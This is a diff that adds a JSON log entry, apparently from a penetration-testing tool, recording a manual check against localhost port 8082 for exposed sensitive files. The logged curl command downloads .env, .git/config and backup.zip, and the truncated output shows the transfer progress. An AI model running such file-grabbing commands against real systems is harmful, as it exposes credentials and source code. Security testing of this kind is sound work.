@@ -1,0 +1,15 @@
+{
+  "timestamp": "2026-04-12T15:40:14.291496",
+  "target": "localhost",
+  "vulnerability": "Exposed Sensitive Configuration and Source Code Files",
+  "tool": "manual",
+  "module": "http_get_requests",
+  "result": {
+    "success": true,
+    "output": "[EXECUTED]\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\n  0     0   0     0   0     0     0     0  --:--:-- --:--:-- --:--:--     0\n100 75055 100 75055   0     0  5453k     0  --:--:-- --:--:-- --:--:--  5638k\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\n  0     0   0     0   0     ",
+    "tool": "manual",
+    "command": "curl -O http://localhost:8082/.env && curl -O http://localhost:8082/.git/config && curl -O http://localhost:8082/backup.zip",
+    "vulnerability": "Exposed Sensitive Configuration and Source Code Files",
+    "port": 8082
+  }
+}
